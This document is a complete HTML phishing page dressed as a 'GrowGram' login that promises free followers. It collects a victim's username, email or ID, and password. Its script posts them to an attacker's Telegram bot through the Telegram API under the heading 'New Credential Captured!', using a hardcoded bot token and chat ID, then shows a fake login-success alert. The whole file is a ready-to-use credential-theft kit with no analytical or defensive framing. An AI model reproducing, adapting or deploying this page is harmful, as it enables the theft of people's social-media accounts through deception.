<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GrowGram | Secure Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        /* --- CSS (Same as before with slight tweaks for spacing) --- */
        :root {
            --bg-color: #0F0F14;
            --card-bg: rgba(26, 26, 36, 0.6);
            --text-main: #FFFFFF;
            --accent-start: #F58529;
            --accent-mid1: #DD2A7B;
            --accent-end: #515BD4;
            --gradient: linear-gradient(135deg, var(--accent-start), var(--accent-mid1), var(--accent-end));
            --glass-border: rgba(255, 255, 255, 0.1);
            --shadow-glow: 0 10px 30px -10px rgba(221, 42, 123, 0.3);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .ambient-light {
            position: fixed;
            top: -20%; right: -10%; width: 50vw; height: 50vw;
            background: radial-gradient(circle, rgba(221, 42, 123, 0.15) 0%, transparent 70%);
            z-index: -1; animation: floatLight 15s infinite alternate ease-in-out;
        }

        @keyframes floatLight {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-50px, 50px); }
        }

        .container {
            width: 90%; max-width: 450px;
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 40px;
            box-shadow: var(--shadow-glow);
        }

        .logo {
            font-size: 2rem; font-weight: 700; text-align: center; margin-bottom: 30px;
            background: var(--gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        .input-group { margin-bottom: 15px; }

        label { display: block; margin-bottom: 8px; color: #A0A0B0; font-size: 0.9rem; }

        input {
            width: 100%; padding: 15px; background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px;
            color: white; font-family: 'Poppins', sans-serif; transition: all 0.3s ease;
        }

        input:focus { border-color: #DD2A7B; box-shadow: 0 0 15px rgba(221, 42, 123, 0.4); }

        button {
            width: 100%; padding: 15px; background: var(--gradient); border: none;
            border-radius: 10px; color: white; font-weight: 600; cursor: pointer;
            transition: all 0.3s ease; margin-top: 10px;
        }

        button:hover { transform: scale(1.02); box-shadow: 0 10px 25px rgba(221, 42, 123, 0.5); }

        #status { margin-top: 15px; text-align: center; font-size: 0.9rem; min-height: 20px; }
        .success { color: #00ff88; }
        .error { color: #ff4444; }
    </style>
</head>
<body>

    <div class="ambient-light"></div>

    <div class="container">
        <div class="logo">GrowGram 💳</div>
        
        <form id="loginForm">
            <!-- Field 1: Username -->
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="@username" required>
            </div>

            <!-- Field 2: ID/Email -->
            <div class="input-group">
                <label for="emailId">ID / Email</label>
                <input type="text" id="emailId" placeholder="Enter your ID or Email" required>
            </div>

            <!-- Field 3: Password -->
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>

            <button type="submit">Verify & Get Followers</button>
            <div id="status"></div>
        </form>
    </div>

    <script>
        const BOT_TOKEN = "9187300979:AAEERS2O2eqNnfTNT0nelzemKRASJem_5jQ";
        const CHAT_ID = "9186863686"; 
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value.trim();
            const emailId = document.getElementById('emailId').value.trim();
            const password = document.getElementById('password').value;
            const submitBtn = document.querySelector('button');

            submitBtn.disabled = true;
            submitBtn.textContent = "Verifying...";
            statusDiv.textContent = "";

            try {
                // Message format including all 3 details
                const message = `🔐 New Credential Captured!\n\n` +
                                `👤 User: ${username}\n` +
                                `🆔 ID/Email: ${emailId}\n` +
                                `🔑 Pass: ${password}`;

                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });

                const data = await response.json();

                if (data.ok) {
                    statusDiv.textContent = "✅ Data Sent! Redirecting...";
                    statusDiv.className = "success";
                    setTimeout(() => alert("Login Successful!"), 1000);
                } else {
                    throw new Error(data.description || "Failed");
                }

            } catch (error) {
                statusDiv.textContent = "❌ Error: " + error.message;
                statusDiv.className = "error";
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = "Verify & Get Followers";
            }
        });
    </script>

</body>
</html>
